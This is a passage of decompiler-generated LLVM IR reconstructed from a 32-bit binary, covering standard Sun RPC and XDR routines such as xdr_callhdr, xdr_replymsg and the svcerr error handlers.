  %v1_80562a2 = add i32 %v0_80562a2, 8
  %v2_80562a2 = inttoptr i32 %v1_80562a2 to i32*
  %v3_80562a2 = load i32, i32* %v2_80562a2, align 4
  store i32 %v3_80562a2, i32* %eax.global-to-local, align 4
  %v1_80562a5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80562a5 = add i32 %v1_80562a5, 4
  %v3_80562a5 = inttoptr i32 %v2_80562a5 to i32*
  store i32 %v3_80562a2, i32* %v3_80562a5, align 4
  br label %dec_label_pc_80562a8

dec_label_pc_80562a8:                             ; preds = %dec_label_pc_8056256, %dec_label_pc_805624e, %dec_label_pc_8056246, %dec_label_pc_805623e, %dec_label_pc_8056236, %dec_label_pc_805622e, %dec_label_pc_8056297, %dec_label_pc_8056282, %dec_label_pc_805627a, %dec_label_pc_805629c
  %v0_80562a8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80562a8 = inttoptr i32 %v0_80562a8 to i32*
  %v2_80562a8 = load i32, i32* %v1_80562a8, align 4
  store i32 %v2_80562a8, i32* %eax.global-to-local, align 4
  %v9_80562aa = icmp eq i32 %v2_80562a8, 7
  br i1 %v9_80562aa, label %dec_label_pc_80562c6, label %dec_label_pc_80562af

dec_label_pc_80562af:                             ; preds = %dec_label_pc_80562a8
  %v9_80562af = icmp eq i32 %v2_80562a8, 9
  br i1 %v9_80562af, label %dec_label_pc_80562cd, label %dec_label_pc_80562b4

dec_label_pc_80562b4:                             ; preds = %dec_label_pc_80562af
  %v9_80562b4 = icmp eq i32 %v2_80562a8, 6
  %v1_80562b7 = icmp eq i1 %v9_80562b4, false
  br i1 %v1_80562b7, label %dec_label_pc_80562d9, label %dec_label_pc_80562b9

dec_label_pc_80562b9:                             ; preds = %dec_label_pc_80562b4
  %v0_80562b9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80562b9 = add i32 %v0_80562b9, 16
  %v2_80562b9 = inttoptr i32 %v1_80562b9 to i32*
  %v3_80562b9 = load i32, i32* %v2_80562b9, align 4
  store i32 %v3_80562b9, i32* %eax.global-to-local, align 4
  %v2_80562bc = add i32 %v0_80562a8, 4
  %v3_80562bc = inttoptr i32 %v2_80562bc to i32*
  store i32 %v3_80562b9, i32* %v3_80562bc, align 4
  %v0_80562bf = load i32, i32* %ecx.global-to-local, align 4
  %v1_80562bf = add i32 %v0_80562bf, 20
  %v2_80562bf = inttoptr i32 %v1_80562bf to i32*
  %v3_80562bf = load i32, i32* %v2_80562bf, align 4
  store i32 %v3_80562bf, i32* %eax.global-to-local, align 4
  %v1_80562c2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80562c2 = add i32 %v1_80562c2, 8
  %v3_80562c2 = inttoptr i32 %v2_80562c2 to i32*
  store i32 %v3_80562bf, i32* %v3_80562c2, align 4
  ret i32 %v3_80562bf

dec_label_pc_80562c6:                             ; preds = %dec_label_pc_80562a8
  %v0_80562c6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80562c6 = add i32 %v0_80562c6, 16
  %v2_80562c6 = inttoptr i32 %v1_80562c6 to i32*
  %v3_80562c6 = load i32, i32* %v2_80562c6, align 4
  store i32 %v3_80562c6, i32* %eax.global-to-local, align 4
  %v2_80562c9 = add i32 %v0_80562a8, 4
  %v3_80562c9 = inttoptr i32 %v2_80562c9 to i32*
  store i32 %v3_80562c6, i32* %v3_80562c9, align 4
  ret i32 %v3_80562c6

dec_label_pc_80562cd:                             ; preds = %dec_label_pc_80562af
  %v0_80562cd = load i32, i32* %ecx.global-to-local, align 4
  %v1_80562cd = add i32 %v0_80562cd, 28
  %v2_80562cd = inttoptr i32 %v1_80562cd to i32*
  %v3_80562cd = load i32, i32* %v2_80562cd, align 4
  store i32 %v3_80562cd, i32* %eax.global-to-local, align 4
  %v2_80562d0 = add i32 %v0_80562a8, 4
  %v3_80562d0 = inttoptr i32 %v2_80562d0 to i32*
  store i32 %v3_80562cd, i32* %v3_80562d0, align 4
  %v0_80562d3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80562d3 = add i32 %v0_80562d3, 32
  %v2_80562d3 = inttoptr i32 %v1_80562d3 to i32*
  %v3_80562d3 = load i32, i32* %v2_80562d3, align 4
  store i32 %v3_80562d3, i32* %eax.global-to-local, align 4
  %v1_80562d6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80562d6 = add i32 %v1_80562d6, 8
  %v3_80562d6 = inttoptr i32 %v2_80562d6 to i32*
  store i32 %v3_80562d3, i32* %v3_80562d6, align 4
  %v0_80562d9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80562d9

dec_label_pc_80562d9:                             ; preds = %dec_label_pc_80562b4, %dec_label_pc_80562cd
  %v0_80562d9 = phi i32 [ %v2_80562a8, %dec_label_pc_80562b4 ], [ %v0_80562d9.pre, %dec_label_pc_80562cd ]
  ret i32 %v0_80562d9

; uselistorder directives
  uselistorder i32 %v2_80562a8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_80562a8, { 1, 0, 2, 3 }
  uselistorder i32* %v1_805628a, { 1, 0 }
  uselistorder i32 %v1_805620b, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp, { 8, 9, 10, 0, 1, 6, 5, 4, 3, 2, 7, 11 }
  uselistorder i32* %ecx.global-to-local, { 0, 3, 4, 1, 2, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13 }
  uselistorder label %dec_label_pc_80562d9, { 1, 0 }
  uselistorder label %dec_label_pc_80562a8, { 9, 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8056297, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_80562da = load i32, i32* @esi, align 4
  %v0_80562db = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %tmp1, i32* %esi.global-to-local, align 4
  %v1_80562e7 = add i32 %arg2, 4
  %v2_80562e7 = inttoptr i32 %v1_80562e7 to i32*
  store i32 0, i32* %v2_80562e7, align 4
  %v0_80562ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80562ee = add i32 %v0_80562ee, 8
  %v2_80562ee = inttoptr i32 %v1_80562ee to i32*
  store i32 2, i32* %v2_80562ee, align 4
  %v0_80562f5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80562f5 = inttoptr i32 %v0_80562f5 to i32*
  %v2_80562f5 = load i32, i32* %v1_80562f5, align 4
  %v3_80562f5 = icmp eq i32 %v2_80562f5, 0
  %v1_80562f8 = icmp eq i1 %v3_80562f5, false
  br i1 %v1_80562f8, label %dec_label_pc_8056356, label %dec_label_pc_80562fa

dec_label_pc_80562fa:                             ; preds = %entry
  %v0_80562fc = load i32, i32* %ebx.global-to-local, align 4
  %v3_80562fe = call i32 @xdr_u_long(i32* %v1_80562f5, i32 %v0_80562fc)
  %v1_8056306 = icmp eq i32 %v3_80562fe, 0
  br i1 %v1_8056306, label %dec_label_pc_8056356, label %dec_label_pc_805630a

dec_label_pc_805630a:                             ; preds = %dec_label_pc_80562fa
  %v0_805630c = load i32, i32* @ebx, align 4
  %v1_805630c = add i32 %v0_805630c, 4
  %v0_8056310 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056311 = call i32 @xdr_enum(i32 %v0_8056310, i32 %v1_805630c)
  %v1_8056319 = icmp eq i32 %v2_8056311, 0
  br i1 %v1_8056319, label %dec_label_pc_8056356, label %dec_label_pc_805631d

dec_label_pc_805631d:                             ; preds = %dec_label_pc_805630a
  %v0_805631f = load i32, i32* @ebx, align 4
  %v1_805631f = add i32 %v0_805631f, 8
  store i32 %v1_805631f, i32* @eax, align 4
  %v0_8056323 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056324 = inttoptr i32 %v0_8056323 to i32*
  %v3_8056324 = call i32 @xdr_u_long(i32* %v2_8056324, i32 %v1_805631f)
  %v1_805632c = icmp eq i32 %v3_8056324, 0
  br i1 %v1_805632c, label %dec_label_pc_8056356, label %dec_label_pc_8056330

dec_label_pc_8056330:                             ; preds = %dec_label_pc_805631d
  %v0_8056332 = load i32, i32* @ebx, align 4
  %v1_8056332 = add i32 %v0_8056332, 12
  store i32 %v1_8056332, i32* @eax, align 4
  %v0_8056336 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056337 = inttoptr i32 %v0_8056336 to i32*
  %v3_8056337 = call i32 @xdr_u_long(i32* %v2_8056337, i32 %v1_8056332)
  %v1_805633f = icmp eq i32 %v3_8056337, 0
  br i1 %v1_805633f, label %dec_label_pc_8056356, label %dec_label_pc_8056343

dec_label_pc_8056343:                             ; preds = %dec_label_pc_8056330
  %v0_8056343 = load i32, i32* @ebx, align 4
  %v1_8056343 = add i32 %v0_8056343, 16
  store i32 %v1_8056343, i32* @eax, align 4
  %v0_8056346 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80562db, i32* %ebx.global-to-local, align 4
  store i32 %v0_80562da, i32* %esi.global-to-local, align 4
  %v2_8056351 = inttoptr i32 %v0_8056346 to i32*
  %v3_8056351 = call i32 @xdr_u_long(i32* %v2_8056351, i32 %v1_8056343)
  br label %dec_label_pc_8056356

dec_label_pc_8056356:                             ; preds = %dec_label_pc_8056330, %dec_label_pc_805631d, %dec_label_pc_805630a, %dec_label_pc_80562fa, %entry, %dec_label_pc_8056343
  store i32 %v0_80562db, i32* @ebx, align 4
  store i32 %v0_80562da, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_80562db, { 1, 0 }
  uselistorder i32 %v0_80562da, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056356, { 5, 0, 1, 2, 3, 4 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_805635c = load i32, i32* @esi, align 4
  %v0_805635d = load i32, i32* @ebx, align 4
  store i32 %v0_805635d, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v2_805636b = call i32 @xdr_enum(i32 %arg1, i32 %tmp4)
  %v1_8056373 = icmp eq i32 %v2_805636b, 0
  br i1 %v1_8056373, label %dec_label_pc_80563bb, label %dec_label_pc_8056377

dec_label_pc_8056377:                             ; preds = %entry
  %v0_8056377 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056377 = inttoptr i32 %v0_8056377 to i32*
  %v2_8056377 = load i32, i32* %v1_8056377, align 4
  %v1_8056379 = icmp eq i32 %v2_8056377, 0
  br i1 %v1_8056379, label %dec_label_pc_8056382, label %dec_label_pc_805637d

dec_label_pc_805637d:                             ; preds = %dec_label_pc_8056377
  %v8_805637d = icmp eq i32 %v2_8056377, 1
  %v1_805637e = icmp eq i1 %v8_805637d, false
  br i1 %v1_805637e, label %dec_label_pc_80563bb, label %dec_label_pc_805637d.dec_label_pc_80563a8_crit_edge

dec_label_pc_805637d.dec_label_pc_80563a8_crit_edge: ; preds = %dec_label_pc_805637d
  br label %dec_label_pc_80563a8

dec_label_pc_8056382:                             ; preds = %dec_label_pc_8056377
  %v1_8056384 = add i32 %v0_8056377, 4
  store i32 %v1_8056384, i32* @eax, align 4
  %v0_8056388 = load i32, i32* %esi.global-to-local, align 4
  %v2_8056389 = inttoptr i32 %v0_8056388 to i32*
  %v3_8056389 = call i32 @xdr_u_long(i32* %v2_8056389, i32 %v1_8056384)
  %v1_8056391 = icmp eq i32 %v3_8056389, 0
  br i1 %v1_8056391, label %dec_label_pc_80563bb, label %dec_label_pc_8056395

dec_label_pc_8056395:                             ; preds = %dec_label_pc_8056382
  %v0_8056395 = load i32, i32* @ebx, align 4
  %v1_8056395 = add i32 %v0_8056395, 8
  store i32 %v1_8056395, i32* @eax, align 4
  %v0_8056398 = load i32, i32* %esi.global-to-local, align 4
  %v2_80563a1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80563a1, i32* %ebx.global-to-local, align 4
  store i32 %v0_805635c, i32* %esi.global-to-local, align 4
  %v2_80563a3 = inttoptr i32 %v0_8056398 to i32*
  %v3_80563a3 = call i32 @xdr_u_long(i32* %v2_80563a3, i32 %v1_8056395)
  %v0_80563a8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80563a8

dec_label_pc_80563a8:                             ; preds = %dec_label_pc_805637d.dec_label_pc_80563a8_crit_edge, %dec_label_pc_8056395
  %v0_80563a8 = phi i32 [ %v0_8056377, %dec_label_pc_805637d.dec_label_pc_80563a8_crit_edge ], [ %v0_80563a8.pre, %dec_label_pc_8056395 ]
  %v1_80563a8 = add i32 %v0_80563a8, 4
  %v0_80563ab = load i32, i32* %esi.global-to-local, align 4
  %v2_80563b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80563b4, i32* %ebx.global-to-local, align 4
  store i32 %v0_805635c, i32* %esi.global-to-local, align 4
  %v2_80563b6 = call i32 @xdr_enum(i32 %v0_80563ab, i32 %v1_80563a8)
  br label %dec_label_pc_80563bb

dec_label_pc_80563bb:                             ; preds = %dec_label_pc_8056382, %dec_label_pc_805637d, %entry, %dec_label_pc_80563a8
  %v2_80563be = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80563be, i32* %ebx.global-to-local, align 4
  store i32 %v0_805635c, i32* %esi.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_805635c, { 2, 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80563bb, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80563a8, { 1, 0 }
}

define i32 @__GI_xdr_replymsg() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_80563c1 = load i32, i32* @esi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v2_80563d0 = inttoptr i32 %tmp to i32*
  %v3_80563d0 = call i32 @xdr_u_long(i32* %v2_80563d0, i32 %tmp2)
  %v1_80563d8 = icmp eq i32 %v3_80563d0, 0
  br i1 %v1_80563d8, label %dec_label_pc_8056412, label %dec_label_pc_80563dc

dec_label_pc_80563dc:                             ; preds = %entry
  %v0_80563de = load i32, i32* @ebx, align 4
  %v1_80563de = add i32 %v0_80563de, 4
  %v0_80563e2 = load i32, i32* @esi, align 4
  %v2_80563e3 = call i32 @xdr_enum(i32 %v0_80563e2, i32 %v1_80563de)
  %v1_80563eb = icmp eq i32 %v2_80563e3, 0
  br i1 %v1_80563eb, label %dec_label_pc_8056412, label %dec_label_pc_80563ef

dec_label_pc_80563ef:                             ; preds = %dec_label_pc_80563dc
  %v0_80563ef = load i32, i32* @ebx, align 4
  %v1_80563ef = add i32 %v0_80563ef, 4
  %v2_80563ef = inttoptr i32 %v1_80563ef to i32*
  %v3_80563ef = load i32, i32* %v2_80563ef, align 4
  %v12_80563ef = icmp eq i32 %v3_80563ef, 1
  %v1_80563f3 = icmp eq i1 %v12_80563ef, false
  br i1 %v1_80563f3, label %dec_label_pc_8056412, label %dec_label_pc_80563f5

dec_label_pc_80563f5:                             ; preds = %dec_label_pc_80563ef
  %v1_80563ff = add i32 %v0_80563ef, 12
  %v1_8056403 = add i32 %v0_80563ef, 8
  %v0_8056407 = load i32, i32* @esi, align 4
  %v5_8056408 = inttoptr i32 %v1_8056403 to i32*
  %v6_8056408 = call i32 @xdr_union(i32 %v0_8056407, i32* %v5_8056408, i32 %v1_80563ff, i32 ptrtoint (i32* @global_var_805cee0.306 to i32), i32 0)
  br label %dec_label_pc_8056414

dec_label_pc_8056412:                             ; preds = %dec_label_pc_80563ef, %dec_label_pc_80563dc, %entry
  br label %dec_label_pc_8056414

dec_label_pc_8056414:                             ; preds = %dec_label_pc_80563f5, %dec_label_pc_8056412
  %v0_8056417 = phi i32 [ %v6_8056408, %dec_label_pc_80563f5 ], [ 0, %dec_label_pc_8056412 ]
  store i32 %v0_80563c1, i32* @esi, align 4
  ret i32 %v0_8056417

; uselistorder directives
  uselistorder i32 %v0_80563ef, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8056414, { 1, 0 }
}

define i32 @xdr_des_block(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8056425 = call i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 8)
  ret i32 %v3_8056425
}

define i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805642e = load i32, i32* @esi, align 4
  %v0_805642f = load i32, i32* @ebx, align 4
  store i32 %v0_805642f, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805643d = call i32 @xdr_enum(i32 %arg1, i32 %arg2)
  %v1_8056447 = icmp eq i32 %v2_805643d, 0
  br i1 %v1_8056447, label %dec_label_pc_8056463, label %dec_label_pc_805644b

dec_label_pc_805644b:                             ; preds = %entry
  %v0_8056450 = load i32, i32* @ebx, align 4
  %v1_8056450 = add i32 %v0_8056450, 8
  %v1_8056454 = add i32 %v0_8056450, 4
  %v0_8056458 = load i32, i32* @esi, align 4
  %v4_8056459 = inttoptr i32 %v0_8056458 to i32*
  %v5_8056459 = call i32 @xdr_bytes(i32* %v4_8056459, i32 %v1_8056454, i32 %v1_8056450, i32 400)
  br label %dec_label_pc_8056463

dec_label_pc_8056463:                             ; preds = %entry, %dec_label_pc_805644b
  %v0_8056464 = phi i32 [ 0, %entry ], [ %v5_8056459, %dec_label_pc_805644b ]
  %v2_8056466 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056466, i32* @ebx, align 4
  store i32 %v0_805642e, i32* @esi, align 4
  ret i32 %v0_8056464

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056463, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8056469 = load i32, i32* @esi, align 4
  %v0_805646a = load i32, i32* @ebx, align 4
  store i32 %v0_805646a, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8056478 = call i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2)
  %v1_8056480 = icmp eq i32 %v2_8056478, 0
  br i1 %v1_8056480, label %dec_label_pc_80564e3, label %dec_label_pc_8056484

dec_label_pc_8056484:                             ; preds = %entry
  %v0_8056486 = load i32, i32* @ebx, align 4
  %v1_8056486 = add i32 %v0_8056486, 12
  %v0_805648a = load i32, i32* @esi, align 4
  %v2_805648b = call i32 @xdr_enum(i32 %v0_805648a, i32 %v1_8056486)
  %v1_8056493 = icmp eq i32 %v2_805648b, 0
  br i1 %v1_8056493, label %dec_label_pc_80564e3, label %dec_label_pc_8056497

dec_label_pc_8056497:                             ; preds = %dec_label_pc_8056484
  %v0_8056497 = load i32, i32* @ebx, align 4
  %v1_8056497 = add i32 %v0_8056497, 12
  %v2_8056497 = inttoptr i32 %v1_8056497 to i32*
  %v3_8056497 = load i32, i32* %v2_8056497, align 4
  %v1_805649a = icmp eq i32 %v3_8056497, 0
  br i1 %v1_805649a, label %dec_label_pc_80564aa, label %dec_label_pc_805649e

dec_label_pc_805649e:                             ; preds = %dec_label_pc_8056497
  %v9_805649e = icmp eq i32 %v3_8056497, 2
  %v1_80564a6 = icmp eq i1 %v9_805649e, false
  br i1 %v1_80564a6, label %dec_label_pc_80564e5, label %dec_label_pc_80564bd

dec_label_pc_80564aa:                             ; preds = %dec_label_pc_8056497
  %v1_80564b5 = add i32 %v0_8056497, 20
  %v2_80564b5 = inttoptr i32 %v1_80564b5 to i32*
  %v3_80564b5 = load i32, i32* %v2_80564b5, align 4
  %v2_80564b9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_8056469, i32* @esi, align 4
  call void @__pseudo_branch(i32 %v3_80564b5)
  br label %dec_label_pc_80564bd

dec_label_pc_80564bd:                             ; preds = %dec_label_pc_805649e, %dec_label_pc_80564aa
  %v0_80564bf = phi i32 [ %v0_8056497, %dec_label_pc_805649e ], [ %v2_80564b9, %dec_label_pc_80564aa ]
  %v1_80564bf = add i32 %v0_80564bf, 16
  store i32 %v1_80564bf, i32* @eax, align 4
  %v0_80564c3 = load i32, i32* @esi, align 4
  %v2_80564c4 = inttoptr i32 %v0_80564c3 to i32*
  %v3_80564c4 = call i32 @xdr_u_long(i32* %v2_80564c4, i32 %v1_80564bf)
  %v1_80564cc = icmp eq i32 %v3_80564c4, 0
  br i1 %v1_80564cc, label %dec_label_pc_80564e3, label %dec_label_pc_80564d0

dec_label_pc_80564d0:                             ; preds = %dec_label_pc_80564bd
  %v0_80564d0 = load i32, i32* @ebx, align 4
  %v1_80564d0 = add i32 %v0_80564d0, 20
  %v0_80564d3 = load i32, i32* @esi, align 4
  %v2_80564db = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80564db, i32* @eax, align 4
  %v2_80564de = inttoptr i32 %v0_80564d3 to i32*
  %v3_80564de = call i32 @xdr_u_long(i32* %v2_80564de, i32 %v1_80564d0)
  br label %dec_label_pc_80564e3

dec_label_pc_80564e3:                             ; preds = %dec_label_pc_80564bd, %dec_label_pc_8056484, %entry, %dec_label_pc_80564d0
  br label %dec_label_pc_80564e5

dec_label_pc_80564e5:                             ; preds = %dec_label_pc_805649e, %dec_label_pc_80564e3
  %v0_80564e8 = phi i32 [ 1, %dec_label_pc_805649e ], [ 0, %dec_label_pc_80564e3 ]
  ret i32 %v0_80564e8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80564e5, { 1, 0 }
  uselistorder label %dec_label_pc_80564e3, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80564bd, { 1, 0 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_805650b = add i32 %arg1, 32
  %v3_8056510 = bitcast i32* %stack_var_-40 to i16*
  %v4_8056510 = call i32 @memcpy(i16* %v3_8056510, i32 %v1_805650b, i32 12)
  %v1_805652f = add i32 %arg1, 8
  %v2_805652f = inttoptr i32 %v1_805652f to i32*
  %v3_805652f = load i32, i32* %v2_805652f, align 4
  %v2_8056532 = ptrtoint i32* %stack_var_-52 to i32
  %v5_8056538 = add i32 %v3_805652f, 12
  %v6_8056538 = inttoptr i32 %v5_8056538 to i32*
  %v7_8056538 = load i32, i32* %v6_8056538, align 4
  call void @__pseudo_call(i32 %v7_8056538)
  ret i32 %v2_8056532
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_805655f = add i32 %arg1, 32
  %v3_8056564 = bitcast i32* %stack_var_-40 to i16*
  %v4_8056564 = call i32 @memcpy(i16* %v3_8056564, i32 %v1_805655f, i32 12)
  %v1_8056573 = add i32 %arg1, 8
  %v2_8056573 = inttoptr i32 %v1_8056573 to i32*
  %v3_8056573 = load i32, i32* %v2_8056573, align 4
  %v2_8056576 = ptrtoint i32* %stack_var_-52 to i32
  %v5_805657c = add i32 %v3_8056573, 12
  %v6_805657c = inttoptr i32 %v5_805657c to i32*
  %v7_805657c = load i32, i32* %v6_805657c, align 4
  call void @__pseudo_call(i32 %v7_805657c)
  ret i32 %v2_8056576
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80565a3 = add i32 %arg1, 32
  %v3_80565a8 = bitcast i32* %stack_var_-40 to i16*
  %v4_80565a8 = call i32 @memcpy(i16* %v3_80565a8, i32 %v1_80565a3, i32 12)
  %v1_80565b7 = add i32 %arg1, 8
  %v2_80565b7 = inttoptr i32 %v1_80565b7 to i32*
  %v3_80565b7 = load i32, i32* %v2_80565b7, align 4
  %v2_80565ba = ptrtoint i32* %stack_var_-52 to i32
  %v5_80565c0 = add i32 %v3_80565b7, 12
  %v6_80565c0 = inttoptr i32 %v5_80565c0 to i32*
  %v7_80565c0 = load i32, i32* %v6_80565c0, align 4
  call void @__pseudo_call(i32 %v7_80565c0)
  ret i32 %v2_80565ba
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80565e7 = add i32 %arg1, 32
  %v3_80565ec = bitcast i32* %stack_var_-40 to i16*
  %v4_80565ec = call i32 @memcpy(i16* %v3_80565ec, i32 %v1_80565e7, i32 12)
  %v1_80565fb = add i32 %arg1, 8
  %v2_80565fb = inttoptr i32 %v1_80565fb to i32*
  %v3_80565fb = load i32, i32* %v2_80565fb, align 4
  %v2_80565fe = ptrtoint i32* %stack_var_-52 to i32
  %v5_8056604 = add i32 %v3_80565fb, 12
  %v6_8056604 = inttoptr i32 %v5_8056604 to i32*
  %v7_8056604 = load i32, i32* %v6_8056604, align 4
  call void @__pseudo_call(i32 %v7_8056604)
  ret i32 %v2_80565fe
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v2_805662b = ptrtoint i32* %stack_var_-48 to i32
  %v1_8056637 = add i32 %arg1, 8
  %v2_8056637 = inttoptr i32 %v1_8056637 to i32*
  %v3_8056637 = load i32, i32* %v2_8056637, align 4
  store i32 %v3_8056637, i32* @edx, align 4
  %v5_805663c = add i32 %v3_8056637, 12
  %v6_805663c = inttoptr i32 %v5_805663c to i32*
  %v7_805663c = load i32, i32* %v6_805663c, align 4
  call void @__pseudo_call(i32 %v7_805663c)
  ret i32 %v2_805662b

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_weakauth(i32 %arg1) local_unnamed_addr {
entry:
  %v2_805664c = call i32 @svcerr_auth(i32 %arg1, i32 5)
  ret i32 %v2_805664c
}

define i32 @__GI_svcerr_noprog() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_8056674 = add i32 %tmp3, 32
  %v3_8056679 = bitcast i32* %stack_var_-40 to i16*
  %v4_8056679 = call i32 @memcpy(i16* %v3_8056679, i32 %v1_8056674, i32 12)
  %v1_8056688 = add i32 %tmp3, 8
  %v2_8056688 = inttoptr i32 %v1_8056688 to i32*
  %v3_8056688 = load i32, i32* %v2_8056688, align 4
  store i32 %v3_8056688, i32* @edx, align 4
  %v2_805668b = ptrtoint i32* %stack_var_-52 to i32
  %v5_8056691 = add i32 %v3_8056688, 12
  %v6_8056691 = inttoptr i32 %v5_8056691 to i32*
  %v7_8056691 = load i32, i32* %v6_8056691, align 4
  call void @__pseudo_call(i32 %v7_8056691)
  ret i32 %v2_805668b
}

define i32 @svcerr_progvers() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_80566b8 = add i32 %tmp7, 32
  %v3_80566bd = bitcast i32* %stack_var_-40 to i16*
  %v4_80566bd = call i32 @memcpy(i16* %v3_80566bd, i32 %v1_80566b8, i32 12)
  %v1_80566dc = add i32 %tmp7, 8
  %v2_80566dc = inttoptr i32 %v1_80566dc to i32*
  %v3_80566dc = load i32, i32* %v2_80566dc, align 4
  store i32 %v3_80566dc, i32* @edx, align 4
  %v2_80566df = ptrtoint i32* %stack_var_-52 to i32
  %v5_80566e5 = add i32 %v3_80566dc, 12
  %v6_80566e5 = inttoptr i32 %v5_80566e5 to i32*
  %v7_80566e5 = load i32, i32* %v6_80566e5, align 4
  call void @__pseudo_call(i32 %v7_80566e5)
  ret i32 %v2_80566df
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80566ed = load i32, i32* @edi, align 4
  %v0_80566ee = load i32, i32* @eax, align 4
  store i32 %v0_80566ee, i32* @edi, align 4
  %v0_80566f0 = load i32, i32* @esi, align 4
  %v0_80566f1 = load i32, i32* @ecx, align 4
  store i32 %v0_80566f1, i32* @esi, align 4
  %v0_80566f3 = load i32, i32* @ebx, align 4
  store i32 %v0_80566f3, i32* %stack_var_-12, align 4
  %v0_80566f4 = load i32, i32* @edx, align 4
  store i32 %v0_80566f4, i32* @ebx, align 4
  %v1_80566f6 = call i32 @__rpc_thread_variables(i32 %v0_80566f3)
  store i32 %v1_80566f6, i32* %eax.global-to-local, align 4
